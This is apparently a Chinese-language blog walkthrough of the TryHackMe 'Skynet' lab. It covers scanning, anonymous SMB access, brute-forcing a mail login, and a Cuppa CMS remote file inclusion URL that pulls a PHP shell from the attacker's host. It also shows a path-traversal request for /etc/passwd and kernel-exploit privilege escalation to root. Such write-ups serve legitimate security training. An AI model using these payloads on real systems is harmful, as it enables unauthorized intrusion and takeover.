---
title: "Thm-Skynet"
date: "2024-08-17"
description: "22/tcp - SSH"
---

机器信息

Skynet

系统

linux

信息

有点意思 使用smb 匿名访问 找到相关的 用户信息之后依旧是目录扫描扫到了 一个旁站是一个邮箱系统 可以试着登陆成功进入smb系统 之后再邮件系统中找到 更改密码的 登陆可以找到 一个milesdyson的 私人目录 可以看到一个新的cms 之后就可以找到一个nday 远程文件包含 可以getshell 后使用 内核提权 拿到root权限

### [](#0X01循例信息收集 "0X01循例信息收集")0X01循例信息收集

```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-14 09:20 UTCNmap scan report for ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)Host is up (0.0054s latency).Not shown: 994 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http110/tcp open  pop3139/tcp open  netbios-ssn143/tcp open  imap445/tcp open  microsoft-dsMAC Address: 02:58:B4:7D:6E:6D (Unknown)# 详细扫描PORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 992331bbb1e943b756944cb9e82146c5 (RSA)|   256 57c07502712d193183dbe4fe679668cf (ECDSA)|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Skynet110/tcp open  pop3        Dovecot pop3d|_pop3-capabilities: TOP CAPA SASL RESP-CODES UIDL AUTH-RESP-CODE PIPELINING139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open  imap        Dovecot imapd|_imap-capabilities: IDLE ID SASL-IR post-login ENABLE Pre-login more capabilities have LITERAL+ OK LOGIN-REFERRALS listed LOGINDISABLEDA0001 IMAP4rev1445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)MAC Address: 02:58:B4:7D:6E:6D (Unknown)Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s| smb2-security-mode: |   311: |_    Message signing enabled but not required|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)| smb2-time: |   date: 2024-06-14T09:22:35|_  start_date: N/A| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: skynet|   NetBIOS computer name: SKYNET\x00|   Domain name: \x00|   FQDN: skynet|_  System time: 2024-06-14T04:22:35-05:00TRACEROUTEHOP RTT     ADDRESS1   0.54 ms ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)
```

#### [](#0X02资产梳理 "0X02资产梳理")0X02资产梳理

### [](#0X10开放端口及服务 "0X10开放端口及服务")0X10开放端口及服务

1.  **22/tcp - SSH**
    
    *   **服务**: OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)
    *   **操作系统**: Ubuntu Linux
    *   **协议**: SSH协议版本 2.0
    *   **SSH Hostkeys**:
        *   RSA 2048-bit key fingerprint: 992331bbb1e943b756944cb9e82146c5
        *   ECDSA 256-bit key fingerprint: 57c07502712d193183dbe4fe679668cf
        *   ED25519 256-bit key fingerprint: 46fa4efc10a54f5757d06d54f6c34dfe
2.  **80/tcp - HTTP**
    
    *   **服务**: Apache HTTP Server 2.4.18 (Ubuntu)
    *   **HTTP服务器头**: Apache/2.4.18 (Ubuntu)
    *   **HTTP标题**: Skynet
3.  **110/tcp - POP3**
    
    *   **服务**: Dovecot pop3d
    *   **POP3能力**: TOP, CAPA, SASL, RESP-CODES, UIDL, AUTH-RESP-CODE, PIPELINING
4.  **139/tcp 和 445/tcp - NetBIOS/SMB**
    
    *   **服务**: Samba smbd 4.3.11-Ubuntu
    *   **工作组**: WORKGROUP
5.  **143/tcp - IMAP**
    
    *   **服务**: Dovecot imapd
    *   **IMAP能力**: IDLE, ID, SASL-IR, post-login, ENABLE, Pre-login, LITERAL+, OK, LOGIN-REFERRALS, LOGINDISABLEDA0001, IMAP4rev1

### [](#主机信息 "主机信息")主机信息

*   **MAC地址**: 02:58:B4:7D:6E:6D (未知制造商)
*   **主机名**: SKYNET
*   **操作系统猜测**:
    *   主要为各种版本的Linux（例如3.10 - 3.13, 5.4, 3.16等）
    *   Android操作系统（5.1, 7.1.1 - 7.1.2）

### [](#网络距离 "网络距离")网络距离

*   目标主机与扫描主机之间的网络跳数：1 hop

### [](#服务信息 "服务信息")服务信息

*   **时间偏移**: 平均时钟偏移约为1小时40分钟
*   **SMB安全模式**:
    *   消息签名已启用但不强制
*   **NetBIOS信息**: 计算机名为SKYNET，域名为空
*   **SMB时间**: 当前时间为2024年6月14日09:22:35（UTC）

> \*\*目前不能偏向究竟是何种操作系统 根据不同服务 可以看到不同的服务

### [](#0x20-smb445 "0x20 smb445")0x20 smb445

> 先试试samba 4.3.11  
> 暂时搁置 脚本扫一遍smb 协议

smb 445

\[\[smb 445#namp 脚本探测\]\]

```shell
Host script results:| smb-enum-shares: |   account_used: guest|   \\10.10.14.193\IPC$: |     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (skynet server (Samba, Ubuntu))|     Users: 2|     Max Users: <unlimited>|     Path: C:\tmp|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\10.10.14.193\anonymous: |     Type: STYPE_DISKTREE|     Comment: Skynet Anonymous Share|     Users: 0|     Max Users: <unlimited>|     Path: C:\srv\samba|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\10.10.14.193\milesdyson: |     Type: STYPE_DISKTREE|     Comment: Miles Dyson Personal Share|     Users: 0|     Max Users: <unlimited>|     Path: C:\home\milesdyson\share|     Anonymous access: <none>|     Current user access: <none>|   \\10.10.14.193\print$: |     Type: STYPE_DISKTREE|     Comment: Printer Drivers|     Users: 0|     Max Users: <unlimited>|     Path: C:\var\lib\samba\printers|     Anonymous access: <none>|_    Current user access: <none>| smb-enum-users: |   SKYNET\milesdyson (RID: 1000)|     Full name:   |     Description: |_    Flags:       Normal user account
```

> 可得信息

1.  **共享信息**：
    
    *   **IPC$**: 这是一个隐藏的IPC服务，允许匿名用户进行读写访问。路径为 `C:\tmp`。
    *   **anonymous**: 这是一个匿名共享，允许匿名用户进行读写访问。路径为 `C:\srv\samba`。
    *   **milesdyson**: 这是Miles Dyson的个人共享，但是不允许匿名用户访问。路径为 `C:\home\milesdyson\share`。
    *   **print$**: 这是打印机驱动程序的共享，不允许匿名用户访问。路径为 `C:\var\lib\samba\printers`。
2.  **用户信息**：
    
    *   **SKYNET\\milesdyson**: 这是一个普通用户账户，RID为1000，没有提供全名或描述信

共享资源

\[\[smb 445#找到特定的资源如何做?#\]\]

### [](#0x11-smb登陆 "0x11 smb登陆")0x11 smb登陆

> 可以看到基本上匿名用户都有一个读写权限我们可以一一在匿名用户权限下 查看可以利用的文件

```c
smbclient //10.10.14.193/anonymous
```

其实这个时候我试了一下nfs感觉还是linux 的感觉多一些  
找了一条通知消息

```text
最近系统故障导致多个密码被更改。所有Skynet员工在看到这条消息后需要更改他们的密码。- 迈尔斯·戴森
```

试试milesdyson用户的私有文件思路断了

### [](#0x20-web "0x20 web")0x20 web

##### [](#信息收集 "信息收集")信息收集

###### [](#目录扫描 "目录扫描")目录扫描

```shell
---- Scanning URL: http://10.10.104.193/ ----==> DIRECTORY: http://10.10.104.193/admin/                              ==> DIRECTORY: http://10.10.104.193/config/                                                                                                          ==> DIRECTORY: http://10.10.104.193/css/                                             + http://10.10.104.193/index.html (CODE:200|SIZE:523)                                   ==> DIRECTORY: http://10.10.104.193/js/                                                                                                                                + http://10.10.104.193/server-status (CODE:403|SIZE:278)                                                                                                               ==> DIRECTORY: http://10.10.104.193/squirrelmail/  [21:32:40] 403 -  278B  - /.ht_wsr.txt                                      [21:32:40] 403 -  278B  - /.htaccess.orig                                   [21:32:40] 403 -  278B  - /.htaccess.sample[21:32:40] 403 -  278B  - /.htaccess.save[21:32:40] 403 -  278B  - /.htaccess_extra                                  [21:32:40] 403 -  278B  - /.htaccess_orig[21:32:40] 403 -  278B  - /.htaccessBAK[21:32:40] 403 -  278B  - /.htaccessOLD                                     [21:32:40] 403 -  278B  - /.htaccessOLD2[21:32:40] 403 -  278B  - /.html                                            [21:32:40] 403 -  278B  - /.htaccess_sc[21:32:40] 403 -  278B  - /.htm                                             [21:32:40] 403 -  278B  - /.httr-oauth                                      [21:32:40] 403 -  278B  - /.htpasswds[21:32:40] 403 -  278B  - /.htpasswd_test[21:32:41] 403 -  278B  - /.htaccess.bak1                                   [21:32:44] 403 -  278B  - /.php                                             [21:32:44] 403 -  278B  - /.php3                                            [21:33:05] 403 -  278B  - /admin/                                           [21:33:46] 403 -  278B  - /config/                                          [21:34:22] 403 -  278B  - /js/                                              [21:35:02] 403 -  278B  - /server-status                                    [21:35:04] 403 -  278B  - /server-status/ 
```

> admin被禁止 访问到一个框架 SquirrelMail version 1.4.23  
> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240625213714.png)

> 发现一个远程代码执行漏洞但是目前唯一的问题是 我不知道登陆用户的账号和密码  
> 因此无法利用 还是要看看能不能找到  
> 之前看到一个信息泄露 milesdyson 猜测可能有他的邮箱

还有个文件包含 h[http://10.10.12.99/squirrelmail/src/redirect.php?plugins\[\]=../../../../etc/passwd%00](http://10.10.12.99/squirrelmail/src/redirect.php?plugins%5B%5D=../../../../etc/passwd%00)  
试了没啥效果 …..

##### [](#回溯smb "回溯smb")回溯smb

> 回溯smb协议  
> 看错了 log目录没看到 里面有log1.txt 泄露了很多可以看到密码  
> 直接bp爆破

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628165637.png)

可以看到cyborg007haloterminator 是用户的密码 milesdyson

#### [](#0x22-继续信息收集 "0x22 继续信息收集")0x22 继续信息收集

```shell
/images               (Status: 301) [Size: 324] [--> http://10.10.66.17/squirrelmail/images/]/help                 (Status: 403) [Size: 276]/themes               (Status: 301) [Size: 324] [--> http://10.10.66.17/squirrelmail/themes/]/plugins              (Status: 301) [Size: 325] [--> http://10.10.66.17/squirrelmail/plugins/]/src                  (Status: 301) [Size: 321] [--> http://10.10.66.17/squirrelmail/src/]/include              (Status: 403) [Size: 276]/config               (Status: 301) [Size: 324] [--> http://10.10.66.17/squirrelmail/config/]/class                (Status: 403) [Size: 276]/functions            (Status: 403) [Size: 276]/po                   (Status: 403) [Size: 276]/locale               (Status: 403) [Size: 276]
```

> 这次咱们用 用户进去看看权限 403 页面登陆了还是禁止的  
> 但是我们看到了三个邮件

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628205742.png)

> smb的密码改了跟我们在smb中获取的信息是一样的 强制修改了密码

先看看smb 共享文件 milesdyson

```plaintext
Try "help" to get a list of possible commands.smb: \> dir  .                                   D        0  Tue Sep 17 09:05:47 2019  ..                                  D        0  Wed Sep 18 03:51:03 2019  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 09:05:14 2019  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 09:05:14 2019  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 09:05:14 2019  notes                               D        0  Tue Sep 17 09:18:40 2019  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 09:05:14 2019  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 09:05:14 2019                9204224 blocks of size 1024. 5653536 blocks availablesmb: \> 
```

全部dump 下来  
得到很多pdf 和一个笔记  
很好 import.txt 放着一个代办清单 在这里可以看到

```text
1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wife
```

陪家人 之后要在CMS /45kra24zxs28v3yd 中开发功能  
其他的看不懂 估计是跟这个神经网络有关 因此  
还是先访问这个页面 感觉也没啥啊  
太无语了  
经过提示 ……. 没想到一个重要的一点  
就是 我们看到他的清单 他第一个任务是想要去做一个cms 的功能点维护  
这个时候我就应该想到 这就是个cms

```shell
cms cuppa扫描
```

### [](#0x23-cuppacms "0x23 cuppacms")0x23 cuppacms

> 这个很快啊 直接就找到了一个nday 远程文件包含  
> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628220759.png)

很舒服 而且看到后端是php  
直接一句话木马 getshell 试试

### [](#0x30-Get-shell "0x30 Get_shell")0x30 Get\_shell

> 还记得刚才的是一个 SquirrelMail version 1.4.23  
> 找了一个rce但是一直连不上

现在换成 cuppa cms 的 RFI

```txt
alerts/alertConfigField.php?urlConfig=http://10.11.69.232:8000/1.php
```

\*\*exp

```shell
http://10.10.70.173/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.69.232/1.php
```

不知道为啥他好像不支持 bash 而且 nc也反弹不会来 蚁剑传一个php反向连接shell  
只能这么做了 直接getshell

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703162847.png)

### [](#0x40Post "0x40Post")0x40Post

> 依旧是信息收集 先来信息收集

```shell
Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
```

可以看到之前的判断没有错误确实是linux的ubuntu  
其实运气挺好的 直接就发现一个内核的nday  
直接就提权了 拿到shell

[内核nday 漏洞地址](https://www.exploit-db.com/exploits/45010)

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703165323.png)

内核版本:

```c
4.4.0-31-generic4.4.0-62-generic4.4.0-81-generic4.4.0-116-generic4.8.0-58-generic4.10.0.42-generic4.13.0-21-generic
```

看了wp 之后发现另外一种方式

tar 计划任务提权

\[\[suid#tar of suid#\]\]
